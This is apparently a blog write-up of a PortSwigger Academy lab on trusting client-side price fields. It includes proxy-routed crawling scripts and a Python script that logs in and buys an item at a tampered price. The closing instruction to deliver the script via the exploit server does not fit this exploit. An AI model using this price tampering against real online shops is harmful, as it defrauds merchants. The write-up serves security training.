--- 
title: "Excessive Trust in Client Side Controls"
author: ""
date: 2024-06-01T16:21:27+01:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
#### Entities
Asset: https://0a1f00410450ba6680aa8a200085007a.web-security-academy.net

#### Enumeration
Access the lab, add the domain to Burp's Target scope and check `Include subdomains`. View `/` route source page and inspect the page, then request all embedded links via Burp proxy using the scripts below.
```shell
base_url="https://0a1f00410450ba6680aa8a200085007a.web-security-academy.net"
paths=$(curl -s "$base_url" | grep -oE '(src|href)="[^"]*"' | cut -d'"' -f2)
for path in $paths; do
  echo "$(curl -sk -x 127.0.0.1:8080 -o /dev/null "${base_url}${path}")"
done
```

```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Specify Variables
base_url = "https://0a1f00410450ba6680aa8a200085007a.web-security-academy.net"
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Parse Base URL
content = BeautifulSoup(requests.get(base_url).text, 'html.parser')

# Find and Request all href resource
for link in content.find_all('a', href=True):
  full_url = urljoin(base_url,link['href'])
  response = requests.get(full_url, proxies=proxies, verify=False)
  print(f"{response.status_code} {response.url}")

# Find and Request all src resource
for img in content.find_all('img', src=True):
  full_url = urljoin(base_url,img['src'])
  response = requests.get(full_url, proxies=proxies, verify=False)
  print(f"{response.status_code} {response.url}")
```

![Enumeration](/images/bizlogic1/01-enumerate-excessive-trust-in-client-side-controls.png "Enumeration")  

#### Exploration
Inspect Burp's Target Site map to find `/cart` resource path which the bash script missed but the python script revealed. Stacking BurpSuite and the Browser with FoxyProxy extension for Burp turned on, perform a user flow for purchasing an item after logging in with the provided user credential  `wiener:peter`.     

![Exploration](/images/bizlogic1/02-explore-excessive-trust-in-client-side-controls.png "Exploration") 

#### Exploitation
The `/login` when requested with valid credentials makes a POST request with `csrf`, `username` and `password` parameters. Observe a POST request  to `/cart`  with `productId`,`redir`, `quantity`, and `price` parameters. When the cart is viewed a GET request is made to `/cart` which returns an ensuing page with a coupon feature that has a `csrf` input tag and a form tag that makes a POST request to `/cart/checkout` to place an order for the item. Send these requests to Burp Repeater, Change the price and sequentially resend these requests. This exploit can be automated with the script below
```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define Variables
base_url = 'https://0a1f00410450ba6680aa8a200085007a.web-security-academy.net/'
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Get CSRF Token
def get_csrf_token(session, url):
  response = session.get(url, proxies=proxies, verify=False)
  csrf_token = BeautifulSoup(response.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')
  return csrf_token

# Purchase Item
def purchase_item(session, url):
  # Login
  login_url = urljoin(base_url, 'login')
  login_csrf_token = get_csrf_token(session, login_url)
  login_payload = {'username': 'wiener', 'password': 'peter', 'csrf': login_csrf_token}
  login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False)
  if login_response.status_code == 200:
    # Add item
    cart_url = urljoin(base_url, 'cart')
    cart_payload = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '1', 'price': '1337'}
    session.post(cart_url, data=cart_payload, proxies=proxies, verify=False)

    # Checkout
    checkout_url = urljoin(base_url, 'cart/checkout')
    checkout_csrf_token = get_csrf_token(session, cart_url)
    checkout_payload = {'csrf': checkout_csrf_token}
    checkout_response = session.post(checkout_url, data=checkout_payload, proxies=proxies, verify=False)
    if checkout_response.status_code == 200:
      print("Purchase successful!")
    else:
      print("Failed to checkout.")
  else:
    print("Failed to log in.")

def main():
  session = requests.Session()
  purchase_item(session, base_url)

if __name__ == "__main__":
  main()
```
Paste the above on the exploit server and deliver exploit to victim.  

![Exploitation](/images/bizlogic1/03-exploit-excessive-trust-in-client-side-controls.png "Exploitation") 

![Solution](/images/bizlogic1/04-lab-solution.png "Solution")   

#### Resources
- https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
- https://github.com/knoxknot/portswigger/tree/main/businsess-logic/01-excessive-trust-in-client-side-controls